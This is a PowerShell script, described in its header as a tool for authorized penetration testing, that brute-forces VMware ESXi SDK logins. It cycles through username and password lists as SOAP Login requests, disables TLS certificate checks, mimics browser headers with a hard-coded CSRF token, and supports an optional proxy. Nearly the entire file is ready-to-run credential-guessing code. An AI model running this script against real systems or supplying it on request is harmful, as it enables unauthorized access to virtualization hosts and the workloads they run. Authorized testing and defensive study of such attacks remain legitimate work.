# PowerShell Brute Force Tool for VMware SDK Login (Authorized Pen Testing Only)
# Usage: .\brute.ps1 -Target <IP/DNS> -User <username or file> -Pass <password or file> -Delay <seconds> [-ProxyIP <IP>] [-ProxyPort <port>]
# Example: .\brute.ps1 -Target 192.168.119.128 -User users.txt -Pass passwords.txt -Delay 1 -ProxyIP 127.0.0.1 -ProxyPort 8080

param (
    [Parameter(Mandatory=$true)]
    [string]$Target,

    [Parameter(Mandatory=$true)]
    [string]$User,

    [Parameter(Mandatory=$true)]
    [string]$Pass,

    [Parameter(Mandatory=$true)]
    [int]$Delay,

    [string]$ProxyIP,

    [int]$ProxyPort = 8080
)

# Ignore TLS certificate errors (for self-signed certs common in testing)
add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls13

# Function to load list from file or use single value
function Get-List {
    param (
        [string]$InputValue
    )
    if (Test-Path $InputValue) {
        return Get-Content $InputValue
    } else {
        return @($InputValue)
    }
}

# Load usernames and passwords
$usernames = Get-List -InputValue $User
$passwords = Get-List -InputValue $Pass

# Base XML template (replace placeholders)
$xmlTemplate = @'
<Envelope xmlns="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <Header>
        <operationID>esxui-cd3d</operationID>
    </Header>
    <Body>
        <Login xmlns="urn:vim25">
            <_this type="SessionManager">ha-sessionmgr</_this>
            <userName>{0}</userName>
            <password>{1}</password>
            <locale>en-US</locale>
        </Login>
    </Body>
</Envelope>
'@

# Headers (mimicking the provided ones; adjust if needed)
$headers = @{
    "Host" = $Target
    "Cookie" = "vmware_client=VMware"
    "Sec-Ch-Ua-Platform" = '"Windows"'
    "Accept-Language" = "en-US,en;q=0.9"
    "Sec-Ch-Ua" = '"Not_A Brand";v="99", "Chromium";v="142"'
    "Sec-Ch-Ua-Mobile" = "?0"
    "Vmware-Csrf-Token" = "nnc7p57o4jips5kxkjr3snwxjyur35lf"  # Note: This may need to be dynamically obtained; using provided value
    "Soapaction" = "urn:vim25/8.0.3.0"
    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
    "Content-Type" = "text/xml"
    "Accept" = "*/*"
    "Origin" = "https://$Target"
    "Sec-Fetch-Site" = "same-origin"
    "Sec-Fetch-Mode" = "cors"
    "Sec-Fetch-Dest" = "empty"
    "Referer" = "https://$Target/ui/"
    "Accept-Encoding" = "gzip, deflate, br"
    "Priority" = "u=1, i"
}

# URL
$url = "https://$Target/sdk/"

# Prepare proxy if specified
$proxy = $null
if ($ProxyIP) {
    $proxy = "http://$ProxyIP:$ProxyPort"
    Write-Output "Using proxy: $proxy"
}

# Brute force loop
foreach ($username in $usernames) {
    foreach ($password in $passwords) {
        # Construct XML body
        $body = [string]::Format($xmlTemplate, $username, $password)
        
        # Set Content-Length dynamically
        $headers["Content-Length"] = $body.Length
        
        try {
            # Send POST request with optional proxy
            $params = @{
                Uri = $url
                Method = 'Post'
                Headers = $headers
                Body = $body
                UseBasicParsing = $true
            }
            if ($proxy) {
                $params['Proxy'] = $proxy
                # Optionally add -ProxyCredential if auth is needed, but assuming no auth for now
            }
            $response = Invoke-WebRequest @params
            
            # Check for success (assuming 200 OK and no fault in response XML)
            if ($response.StatusCode -eq 200 -and $response.Content -notmatch "<faultstring>") {
                Write-Output "Success! Username: $username Password: $password"
                Write-Output "Response: $($response.Content)"
                # Optionally exit on success: return
            } else {
                Write-Output "Failed: Username: $username Password: $password Status: $($response.StatusCode)"
            }
        } catch {
            Write-Output "Error: Username: $username Password: $password Error: $($_.Exception.Message)"
        }
        
        # Delay between attempts
        Start-Sleep -Seconds $Delay
    }
}

Write-Output "Brute force completed."
